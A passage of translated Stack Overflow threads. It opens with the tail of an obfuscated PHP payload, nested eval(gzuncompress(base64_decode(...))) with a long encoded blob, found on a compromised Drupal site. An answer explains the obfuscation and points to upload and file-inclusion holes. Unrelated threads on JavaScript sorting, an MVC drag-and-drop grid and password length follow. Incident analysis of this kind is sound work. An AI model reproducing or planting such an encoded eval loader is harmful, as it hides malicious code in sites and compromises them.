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'))); ?><?php eval(gzuncompress(base64_decode('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'))); ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:48:05.177

首先，你需要知道两件事：

1.  这可能不是你的错。如果它是共享主机，则黑客可能已经破坏了主机上其他数千个网站中的任何一个，将服务器植根，然后从内部攻击您的网站。
2.  话虽如此，这可能是你的错，所以不要放松。还是找坑。

但是，除了查看日志之外，还要查找站点中的漏洞。该网站是否接受用户提交的内容？如果有，是否有文件上传。如果是这样，您是检查文件的 MIME 类型还是只是扩展名。

另一件事是 RFI 和 LFI 黑客。这些漏洞允许黑客将 shell 注入您的站点，从而有效地使他们成为具有完整文件访问权限的管理员。寻找这些漏洞。

如果您可以在`.txt`文件中发布代码，我很乐意为您“破译”它。

如果我还能想到什么，我会补充。

*编辑 1*

因此，基本上黑客使用`base64`并`gzcompress`“混淆”了代码。然后，他使用该`eval()`函数执行未压缩的代码。`eval()`因此，本质上，您可以通过删除函数并运行代码来查看第一层代码。不幸的是，在第一层下，我正在查看另一层。

另外，既然你说 Drupal.... 你可能正在使用插件或插件。Drupal 可能是安全的，但那些插件或插件可能不安全。他们中的任何一个都以任何方式处理表单上传或文件吗？

*编辑 2*

1.  [第一层](http://chopapp.com/#y7qkiwtm)（由 OP 提交）。
2.  [第二层](http://chopapp.com/#737x7b73)（初始`gzuncompress`和`base64_decode()`）。

还在努力...

# javascript - 这种按多个属性对对象数组进行排序的方法有多可靠？

> ID：11866969
> 
> 赞同：2
> 
> 时间：2012-08-08T14:40:23.190
> 
> 标签：javascript

我需要对对象字面量数组进行排序，并且需要比较对象的 2 个属性。我在网上找到了一个如何做到这一点的示例，但我在规范中找不到任何支持文档。任何人都可以确认您可以在 Javascript 中执行以下操作，并可能将我指向一些文档：

```
users.sort(function(a, b){ 
    return [a.name, a.company] > [b.name, b.company] ? 1:-1; 
}); 
```

编辑：我现在明白为什么这是有效的，因为它只是连接然后比较字符串。我认为意图不是很清楚，所以我可能会写一些不那么骇人听闻的东西。

此外，我并不是简单地询问您是否可以创建自定义排序函数，您可以在文档中轻松找到该函数。我在问我在这种特殊情况下的做法是否有效。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:41:57.187

你可以。

*   [MDN 文档](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort)（通常是对开发人员最友好的在线参考）
*   [ECMA 标准](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf)（第 15.4.4.11 节）（官方标准）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T15:01:25.727

正如我在评论中已经解释的那样，是的，你*可以*这样做。

**这里发生了什么？**

每当您在比较中使用数组时，数组都会转换为它的*字符串表示形式*，它只是一个以逗号分隔的元素列表。JavaScript**不会**单独比较数组的每个元素。

因此，在您的示例中，您将`a.name`与`a.company`和`b.name`与连接`b.company`并比较此连接：

```
"nameA,companyA" > "nameB,companyB" 
```

**问题是什么？**

如果这些值中的任何一个是数字（不是字符串），您将遇到问题，因为数字的字典顺序不同于它们的数字顺序。

例如：

```
> ['a', 100] > ['a', 11]
  false 
```

您最终会与 进行比较`'a,100'`，`'a,11'`并且由于`0`在 之前`1`，第一个字符串小于第二个字符串。

* * *

底线是：如果你知道你只处理字符串值，你可能没问题，尽管隐式连接可能难以理解。
一旦你有混合数据类型，你真的应该单独比较这些值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:45:17.370

在`sort`功能方面，您可以参考`Mozilla Developer Network`参考。

**参考**：[https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort)

它基本上允许您定义一个`sort`可以实现的回调函数。为什么这种排序功能特别有效？试试这个简化的例子：

```
foo = [1, 2]
[1, 2]
bar = [3, 4]
[3, 4]
foo > bar
>> false
bar > foo
>> true 
```

通过比较数组的字符串表示，Javascript 可以评估数组的值作为结果。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:43:01.383

是的，它是有效的。这是 MDN[文档](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-08T14:43:36.030

当然，`Array.sort`是一个接受`cmp`参数的函数，它本身就是一个接受两个参数进行比较的函数：

[https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort)

# asp.net-mvc - 如何使用相互交换的拖放图像创建 .NET/MVC 网格视图？

> ID：11866970
> 
> 赞同：1
> 
> 时间：2012-08-08T14:40:24.937
> 
> 标签：asp.net-mvc, image, drag-and-drop, grid

我的任务是创建一个类似于 POS（销售点）系统的编辑套件的网站应用程序，它显示具有固定行数/列数（8X4 共 40 个正方形）的图像网格，显示（食物）菜单项。例如，行/列 1/1 可能显示“Combo Meal #1”图标，行/列 1/2 可能显示“Combo Meal #2”等。POS 系统允许用户从网格位置到另一个，然后他们两个交换。即，如果您将Combo Meal #1 的图标拖到Combo Meal #2 上，那么他们将在gridview 中交换位置。

Stack 上似乎没有任何东西适合这种确切的情况，因为如果可能的话，我想使用 .NET MVC；我在 Telerik 工具中也找不到任何现成的解决方案。这两个链接是我见过的最接近的：

[http://jqueryui.com/demos/draggable/#option-refreshPositions](http://jqueryui.com/demos/draggable/#option-refreshPositions)

[http://www.redips.net/my/preview/REDIPS_drag/](http://www.redips.net/my/preview/REDIPS_drag/)

...但它们只是部分解决方案。

有谁知道实际上提供这种行为的工具？或者对我自己如何做到这一点有任何见解？（我还在经历 MVC 等方面的学习曲线。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:46:50.980

我不熟悉 Telerik，但是当您发布 jQuery 时，这个[jQuery UI Sortable](http://jqueryui.com/demos/sortable/#display-grid)示例不起作用吗？

# security - 最小用户密码长度

> ID：11866972
> 
> 赞同：0
> 
> 时间：2012-08-08T14:40:31.327
> 
> 标签：security, cryptography, password-encryption

在英国的 Tesco 进行在线杂货购物的用户帐户需要 6 到 10 个字符的密码。虽然他们将密码限制为 10 个字符（我的密码生成器默认为 32 个）让我有些恼火，但他们允许 6 个字符的密码来保护用户数据（包括信用卡详细信息）这一事实让我感到担忧。

6 个字符的密码是否代表安全风险，或者它们是一个很好的例子？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T21:49:42.507

6 个字符的密码很短，可能太短了。此外，设置最大密码大小是没有意义的，因为您应该只存储一个散列（或者更好的是 bcrypt、scrypt 或 PBKDF2 的输出）。

也就是说，这取决于系统如何处理密码是否安全。例如，PIN 通常约为 4..6*位*。它仍然非常安全，因为在 PIN 被阻止之前，您的银行可能只允许您输入大约 3 到 5 次不正确的 PIN。

如果您将密码用作加密数据的密钥，而没有系统来控制对所述数据的访问（将文件加密到可能被盗的硬盘上），那么 6 个字符*太短了*。您将需要一个完整的密码和密钥派生方案来确保加密容器的安全。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:52:11.767

如果密码包含大写、小写、数字和符号，那么一次在线攻击可能需要 23 年，而且密码被其他方法（密码丢失、恢复方法）访问的可能性更大，我个人不会满意6 个字符的密码

密码强度测试器[https://www.grc.com/haystack.htm](https://www.grc.com/haystack.htm)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T15:06:54.440

安全性是可用性和安全性之间的权衡。人们应该能够记住他们的密码，但它也应该是安全的。许多公司采用简单的方法并允许使用短密码，因为选择安全密码应该是用户的责任。我不认为，普通用户可以处理这个。我们的工作是让他们了解什么是好的密码。

我认为 10 个字符的限制与 6 个字符的限制所代表的风险大致相同。我的密码（不是随机生成的）大约是 12-16 个字符。因此，在您的情况下，即使我有一个，我也不允许使用一个好的密码。该政策与我们提高人们对良好密码敏感度的使命背道而驰。

